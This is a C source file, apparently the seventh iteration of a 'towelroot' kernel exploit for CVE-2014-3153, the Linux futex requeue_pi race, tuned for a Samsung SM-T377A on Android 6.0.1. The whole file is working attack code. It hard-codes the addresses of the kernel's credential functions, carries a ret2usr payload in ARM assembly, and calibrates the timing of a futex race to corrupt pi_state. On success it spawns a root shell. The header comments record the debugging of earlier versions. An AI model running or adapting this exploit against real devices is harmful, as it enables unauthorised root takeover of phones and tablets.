/*
 * towelroot7.c — CVE-2014-3153 busy-wait timing + race-event detection
 *
 * Target: Samsung SM-T377A, Android 6.0.1, kernel 3.10.9 ARMv7
 *         No KASLR, No PXN, No stack canaries
 *
 * FIXES over towelroot6:
 *
 *   BUG 1 — nanosleep scheduling jitter:
 *     towelroot6 used nanosleep() for the critical pre-fire delay.
 *     On Android kernels (HZ=100 or HZ=250), nanosleep of ~3ms may
 *     oversleep by 0-10ms, causing us to always fire AFTER the victim's
 *     timeout → 0 requeue hits.
 *     FIX: busy_wait_us() using clock_gettime() — accurate to ~1µs,
 *     immune to scheduling jitter.
 *
 *   BUG 2 — FUTEX_LOCK_PI hangs on race-event:
 *     When the race fires and corrupts pi_state, the next round's
 *     LOCK_PI(F2) blocks forever (kernel thinks F2 still has an owner).
 *     FIX: LOCK_PI with 10ms timeout. ETIMEDOUT from LOCK_PI = "race event"
 *     counter. Recovery: WAKE+reset futexes, continue.
 *
 * EVIDENCE from towelroot6 run:
 *   delta=+500µs, +300µs, +200µs: 0 hits (nanosleep overshooting, firing
 *     after victim timed out — confirmed as jitter issue)
 *   delta=+100µs: DEADLOCK (race fired! pi_state corrupted, LOCK_PI hung)
 *   → Race IS possible at this timing. Need accurate fire timing.
 *
 * RACE MODEL (unchanged from towelroot6):
 *   Victim (CPU 0): signals g_in_futex=1, calls WAIT_REQUEUE_PI(F1, T)
 *   Main (CPU 1):   busy-waits (T - delta) µs, fires CMP_REQUEUE_PI + UNLOCK_PI
 *   Race: victim's hrtimer fires at t=T while CPU 1 executes CMP_REQUEUE_PI
 *
 * KEY DIAGNOSTIC: requeue_hits + race_events
 *   requeue_hits = CMP_REQUEUE_PI returned >0 (victim was in futex when we fired)
 *   race_events  = LOCK_PI timed out in next round (pi_state corrupted = race fired)
 *   anomalies    = unexpected return values from victim's WAIT_REQUEUE_PI
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <linux/futex.h>
#include <stdatomic.h>

/* ========== Device-specific constants ========== */
#define COMMIT_CREDS        0xC0054328UL
#define PREPARE_KERNEL_CRED 0xC00548E0UL

/* ========== Futex layout — separate cache lines ========== */
static volatile int *fmem;
#define F1  ((volatile int *)&fmem[0])
#define F2  ((volatile int *)&fmem[16])

/* ========== Synchronization ========== */
static atomic_int g_go        = ATOMIC_VAR_INIT(0);
static atomic_int g_in_futex  = ATOMIC_VAR_INIT(0);
static atomic_int g_vdone     = ATOMIC_VAR_INIT(0);
static atomic_int g_anomalies = ATOMIC_VAR_INIT(0);
static atomic_int g_requeues  = ATOMIC_VAR_INIT(0);
static atomic_int g_race_events = ATOMIC_VAR_INIT(0); /* pi_state corruption count */
static atomic_int g_root      = ATOMIC_VAR_INIT(0);

static int g_timeout_us = 3000; /* set before victim_thread created */

/* ========== Timing ========== */
static inline long long ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

/*
 * Busy-wait for exactly `us` microseconds using CLOCK_MONOTONIC.
 * Unlike nanosleep, this is immune to OS scheduling jitter.
 * Uses sched_yield() to avoid consuming 100% of a CPU timeslice
 * while still staying accurate to ~1µs.
 */
static void busy_wait_us(int us) {
    if (us <= 0) return;
    long long deadline = ns_now() + (long long)us * 1000LL;
    while (ns_now() < deadline)
        sched_yield(); /* release CPU slice but stay in RUNNING state */
}

static void sleep_us(int us) {
    if (us <= 0) return;
    struct timespec ts = { 0, (long)us * 1000L };
    nanosleep(&ts, NULL);
}

static struct timespec abs_mono_us(int us) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += (long)us * 1000L;
    while (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    return ts;
}

/* ========== CPU pinning ========== */
static void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

/* ========== ret2usr payload ========== */
static void __attribute__((noinline, optimize("O0"), used))
kernel_payload(void) {
    void *(*pkc)(unsigned long)   = (void *(*)(unsigned long))PREPARE_KERNEL_CRED;
    int   (*cc)(void *)           = (int (*)(void *))COMMIT_CREDS;
    void *cred = NULL;
    __asm__ volatile(
        "mov  r0, #0\n\t"
        "blx  %1\n\t"
        "mov  %0, r0\n\t"
        : "=r"(cred) : "r"(pkc) : "r0", "r1", "r2", "r3", "lr"
    );
    if (cred) {
        __asm__ volatile(
            "mov  r0, %0\n\t"
            "blx  %1\n\t"
            : : "r"(cred), "r"(cc) : "r0", "r1", "r2", "r3", "lr"
        );
    }
}

static int check_root(void) {
    if (getuid() == 0 || geteuid() == 0) {
        atomic_store(&g_root, 1);
        return 1;
    }
    return 0;
}

static void spawn_shell(void) {
    printf("[!!!] UID=0 — spawning root shell!\n");
    fflush(stdout);
    execl("/system/bin/sh", "sh", NULL);
    execl("/bin/sh", "sh", NULL);
    _exit(0);
}

/* ========== Victim thread ========== */
static void *victim_thread(void *arg) {
    (void)arg;
    pin_to_cpu(0);

    while (1) {
        int go = atomic_load(&g_go);
        if (go == -1) break;
        if (go == 0) { sched_yield(); continue; }

        /*
         * Set g_in_futex BEFORE computing the timeout. Main uses this as the
         * timing reference T0. The actual futex timeout is computed right after,
         * so T0 ≈ T_timeout_start (within a few µs on the same CPU).
         */
        atomic_store(&g_in_futex, 1);

        struct timespec ts = abs_mono_us(g_timeout_us);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        int err = errno;

        atomic_store(&g_in_futex, 0);

        if (ret == 0) {
            /* Requeued and became PI owner of F2 */
            if (check_root()) {
                atomic_store(&g_vdone, 1);
                return (void *)1;
            }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (err != ETIMEDOUT && err != EAGAIN && err != EINTR) {
            atomic_fetch_add(&g_anomalies, 1);
        }

        atomic_store(&g_vdone, 1);

        /* Wait for main to reset g_go before next round */
        while (atomic_load(&g_go) != 0 && atomic_load(&g_go) != -1)
            sched_yield();
    }
    return NULL;
}

/* ========== Single race round ========== */
/*
 * delta_us > 0: fire delta_us BEFORE victim timeout (e.g., +100 = 100µs early)
 * delta_us = 0: fire right at victim timeout
 * delta_us < 0: fire |delta_us| AFTER victim timeout
 *
 * Returns:  1 = root achieved
 *           0 = normal (clean round)
 *          -1 = race event (LOCK_PI timed out = pi_state corrupted)
 * *requeued: 1 if CMP_REQUEUE_PI found the victim in the futex
 */
static int race_once(int delta_us, int *requeued) {
    /* Reset futex words */
    *F1 = 0;
    *F2 = 0;

    /*
     * LOCK_PI with 10ms timeout.
     * Normal: returns 0 immediately (F2 is uncontested).
     * Race event: returns ETIMEDOUT (pi_state corrupted from prior round,
     *             F2 "owned" by a ghost → this round's LOCK_PI hangs briefly,
     *             we detect it and recover).
     */
    {
        struct timespec lock_timeout = abs_mono_us(10000); /* 10ms */
        int r = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &lock_timeout, NULL, 0);
        if (r != 0) {
            /* ETIMEDOUT or EDEADLK or other — pi_state likely corrupted */
            atomic_fetch_add(&g_race_events, 1);
            /* Force-reset F2 and try again */
            *F2 = 0;
            syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
            if (requeued) *requeued = 0;
            /* Signal victim to skip this round */
            atomic_store(&g_vdone, 0);
            atomic_store(&g_go, 1);
            sleep_us(100);
            atomic_store(&g_go, 0);
            while (!atomic_load(&g_vdone)) sched_yield();
            return check_root() ? 1 : -1;
        }
    }

    /* Arm: signal victim to enter WAIT_REQUEUE_PI */
    atomic_store(&g_vdone, 0);
    atomic_store(&g_go, 1);

    /* Wait for victim's "about to enter futex" signal */
    while (!atomic_load(&g_in_futex)) sched_yield();

    /*
     * CRITICAL TIMING PATH — must be accurate.
     *
     * T0 = now (victim just set g_in_futex). Victim will call abs_mono_us(T)
     * in ~1-5µs, setting timeout = T0 + T. Timer fires at T0 + T.
     *
     * We want to fire CMP_REQUEUE_PI at T0 + T - delta_us.
     * Total wait: (T - delta_us) µs from T0, minus ~5µs for g_in_futex latency.
     *
     * Use busy_wait_us() — immune to nanosleep's OS scheduling jitter.
     * Using nanosleep here would cause oversleeping (proven by towelroot6:
     * delta=+200µs gave 0 hits because nanosleep overshooting the 3ms target).
     */
    long long t0 = ns_now();
    int wait_us = g_timeout_us - delta_us - 5; /* account for ~5µs g_in_futex latency */
    if (wait_us > 0) busy_wait_us(wait_us);

    long long t_fire = ns_now();
    long long actual_delay_us = (t_fire - t0) / 1000LL;

    /* FIRE: CMP_REQUEUE_PI races with victim's hrtimer expiry */
    int rq = (int)syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0,
                           (void *)(intptr_t)1, (void *)F2, 0);
    if (requeued) *requeued = (rq > 0) ? 1 : 0;
    if (rq > 0) atomic_fetch_add(&g_requeues, 1);

    /* UNLOCK: main is PI owner of F2, valid to unlock here */
    syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    /* Ensure victim unblocks even if we missed */
    syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

    (void)actual_delay_us; /* used in verbose mode only */

    /* Reset go and wait for victim */
    atomic_store(&g_go, 0);
    while (!atomic_load(&g_vdone) && !atomic_load(&g_root))
        sched_yield();

    if (atomic_load(&g_root)) return 1;
    return 0;
}

/* ========== Delta-sweep calibration ========== */
/*
 * Sweeps delta values from +fire_before (early) to -fire_after (late).
 * For each delta:
 *   - Runs `iters_per_delta` rounds
 *   - Reports: requeue_hits% + race_events (pi_state corruptions)
 * Race events at a specific delta = that delta hits the race window.
 * Then runs bulk iters at the delta with highest race_events.
 */
static int calibration_sweep(int timeout_us, int iters_per_delta, int bulk_iters) {
    /* Sweep from +500µs before (always-early) to -300µs after (always-late) */
    static const int deltas[] = { 500, 300, 200, 150, 100, 50, 25, 0, -25, -50, -100, -200, -300 };
    static const int ndelta   = 13;

    g_timeout_us = timeout_us;

    printf("\n[*] === Calibration sweep T=%dµs  busy-wait timing ===\n", timeout_us);
    printf("[*]   delta    hits   race_events  anomalies\n");
    fflush(stdout);

    pthread_t vtid;
    atomic_store(&g_go, 0);
    atomic_store(&g_vdone, 0);
    atomic_store(&g_in_futex, 0);
    pthread_create(&vtid, NULL, victim_thread, NULL);

    pin_to_cpu(1);

    int best_delta      = 0;
    int best_race_events = 0;

    for (int d = 0; d < ndelta; d++) {
        int delta = deltas[d];
        int hits  = 0;
        int race_events_start = atomic_load(&g_race_events);
        int anomalies_start   = atomic_load(&g_anomalies);

        for (int i = 0; i < iters_per_delta; i++) {
            int rq = 0;
            int r  = race_once(delta, &rq);
            if (rq) hits++;
            if (r == 1 || atomic_load(&g_root)) goto root_achieved;
        }

        int new_race = atomic_load(&g_race_events) - race_events_start;
        int new_anom = atomic_load(&g_anomalies) - anomalies_start;
        int hit_pct  = hits * 100 / iters_per_delta;

        printf("[*]  %+5dµs   %3d%%    %4d          %4d    uid=%d\n",
               delta, hit_pct, new_race, new_anom, getuid());
        fflush(stdout);

        if (new_race > best_race_events) {
            best_race_events = new_race;
            best_delta = delta;
        }
    }

    printf("\n[*] Best delta for race: %+dµs (%d race_events)\n",
           best_delta, best_race_events);

    if (best_race_events == 0) {
        printf("[!] No race events detected — try wider sweep or different timeout\n");
        /* Still run bulk at delta=0 */
        best_delta = 0;
    }

    printf("[*] Bulk run: %d iters at T=%dµs delta=%+dµs\n",
           bulk_iters, timeout_us, best_delta);
    fflush(stdout);

    {
        long long t0 = ns_now();
        int re0 = atomic_load(&g_race_events);
        int rq0 = atomic_load(&g_requeues);
        int an0 = atomic_load(&g_anomalies);

        for (int i = 0; i < bulk_iters; i++) {
            int r = race_once(best_delta, NULL);
            if (r == 1 || atomic_load(&g_root)) goto root_achieved;

            if ((i + 1) % 2000 == 0) {
                long long ms = (ns_now() - t0) / 1000000LL;
                printf("[*]  %5d/%d | race_events=%d requeues=%d anomalies=%d | uid=%d | %lldms\n",
                       i + 1, bulk_iters,
                       atomic_load(&g_race_events) - re0,
                       atomic_load(&g_requeues) - rq0,
                       atomic_load(&g_anomalies) - an0,
                       getuid(), ms);
                fflush(stdout);
            }
        }

        printf("[*] Bulk done: race_events=%d requeues=%d anomalies=%d uid=%d\n",
               atomic_load(&g_race_events) - re0,
               atomic_load(&g_requeues) - rq0,
               atomic_load(&g_anomalies) - an0,
               getuid());
    }

    atomic_store(&g_go, -1);
    pthread_join(vtid, NULL);
    return 0;

root_achieved:
    atomic_store(&g_go, -1);
    pthread_join(vtid, NULL);
    return 1;
}

/* ========== Multi-victim mode ========== */
/*
 * 2 victims, slightly staggered timeouts (3000µs and 3050µs).
 * Run at the delta identified as best from calibration.
 * More PI waiter churn on CPU 0 → wider race surface.
 */
#define MV_N 2
static atomic_int g_mv_go   = ATOMIC_VAR_INIT(0);
static atomic_int g_mv_done = ATOMIC_VAR_INIT(0);
static atomic_int g_mv_vdone = ATOMIC_VAR_INIT(0);
static int g_mv_timeouts[MV_N] = { 3000, 3050 };

static void *mv_victim(void *arg) {
    int idx = (int)(intptr_t)arg;
    pin_to_cpu(0);
    while (!atomic_load(&g_mv_done)) {
        while (!atomic_load(&g_mv_go) && !atomic_load(&g_mv_done))
            sched_yield();
        if (atomic_load(&g_mv_done)) break;

        struct timespec ts = abs_mono_us(g_mv_timeouts[idx]);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, F2, 0);
        if (ret == 0) {
            if (check_root()) { atomic_store(&g_mv_done, 1); return (void *)1; }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        }
        atomic_fetch_add(&g_mv_vdone, 1);
    }
    return NULL;
}

static int multi_victim_loop(int iters, int delta_us) {
    printf("\n[*] === Multi-victim mode: %d iters delta=%+dµs ===\n", iters, delta_us);
    fflush(stdout);

    atomic_store(&g_mv_done, 0);
    atomic_store(&g_mv_go, 0);
    atomic_store(&g_mv_vdone, 0);

    pthread_t vt[MV_N];
    for (int i = 0; i < MV_N; i++)
        pthread_create(&vt[i], NULL, mv_victim, (void *)(intptr_t)i);
    pin_to_cpu(1);

    long long t0 = ns_now();

    for (int i = 0; i < iters && !atomic_load(&g_mv_done); i++) {
        *F1 = 0; *F2 = 0;

        /* LOCK_PI with timeout for recovery */
        struct timespec lts = abs_mono_us(10000);
        int lr = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &lts, NULL, 0);
        if (lr != 0) {
            atomic_fetch_add(&g_race_events, 1);
            *F2 = 0;
            syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        }

        atomic_store(&g_mv_vdone, 0);
        atomic_store(&g_mv_go, 1);

        /* Busy-wait for (timeout - delta) */
        busy_wait_us(g_mv_timeouts[0] - delta_us - 5);

        /* Requeue up to MV_N victims */
        int rq = (int)syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0,
                               (void *)(intptr_t)MV_N, (void *)F2, 0);
        if (rq > 0) atomic_fetch_add(&g_requeues, rq);

        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        atomic_store(&g_mv_go, 0);

        while (atomic_load(&g_mv_vdone) < MV_N && !atomic_load(&g_mv_done))
            sched_yield();

        if (atomic_load(&g_root) || check_root()) {
            printf("\n[!!!] ROOT via multi-victim at iter %d!\n", i);
            goto mv_done;
        }

        if ((i + 1) % 1000 == 0) {
            printf("[*] MV %5d/%d | race_events=%d requeues=%d | uid=%d | %lldms\n",
                   i + 1, iters,
                   atomic_load(&g_race_events), atomic_load(&g_requeues),
                   getuid(), (ns_now() - t0) / 1000000LL);
            fflush(stdout);
        }
    }

mv_done:
    atomic_store(&g_mv_done, 1);
    for (int i = 0; i < MV_N; i++) {
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        pthread_join(vt[i], NULL);
    }
    printf("[*] Multi-victim done: race_events=%d requeues=%d uid=%d\n",
           atomic_load(&g_race_events), atomic_load(&g_requeues), getuid());
    return atomic_load(&g_root);
}

/* ========== Main ========== */
int main(void) {
    printf("=== towelroot7 — CVE-2014-3153 busy-wait timing — SM-T377A ===\n");
    printf("[*] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());
    printf("[*] commit_creds=0x%08lX  prepare_kernel_cred=0x%08lX\n",
           COMMIT_CREDS, PREPARE_KERNEL_CRED);
    fflush(stdout);

    /* Check FUTEX_LOCK_PI */
    {
        int ft = 0;
        int r = syscall(SYS_futex, &ft, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        if (r != 0 && errno == ENOSYS) {
            fprintf(stderr, "[-] FUTEX_LOCK_PI not supported\n");
            return 1;
        }
        syscall(SYS_futex, &ft, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[+] FUTEX_LOCK_PI available\n");
    }

    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    printf("[*] CPUs online: %d\n", ncpu);
    if (ncpu < 2) { fprintf(stderr, "[-] Need >= 2 CPUs\n"); return 1; }

    fmem = (volatile int *)mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (fmem == MAP_FAILED) { perror("mmap"); return 1; }

    /* Measure busy_wait accuracy */
    {
        long long t0 = ns_now();
        busy_wait_us(1000);
        long long actual = (ns_now() - t0) / 1000LL;
        printf("[*] busy_wait calibration: requested=1000µs actual=%lldµs\n", actual);
        fflush(stdout);
    }

    /*
     * Phase 1: T=3ms calibration sweep (500 iters/delta, 13 deltas)
     * Then 30K bulk iters at best delta.
     */
    if (calibration_sweep(3000, 500, 30000)) goto root;

    /*
     * Phase 2: T=5ms calibration sweep
     * Longer timeout = more scheduling tolerance.
     */
    if (calibration_sweep(5000, 500, 30000)) goto root;

    /*
     * Phase 3: T=1ms calibration sweep
     * Shorter = faster iterations, tighter window.
     */
    if (calibration_sweep(1000, 300, 20000)) goto root;

    /*
     * Phase 4: Multi-victim at T=3ms, delta from phase 1 best.
     * Use 50µs (conservative center of window) if phase 1 found races there.
     */
    if (multi_victim_loop(20000, 50)) goto root;

    printf("\n[*] All phases complete. uid=%d\n", getuid());
    fflush(stdout);
    return 0;

root:
    if (getuid() == 0 || geteuid() == 0) spawn_shell();
    return 0;
}
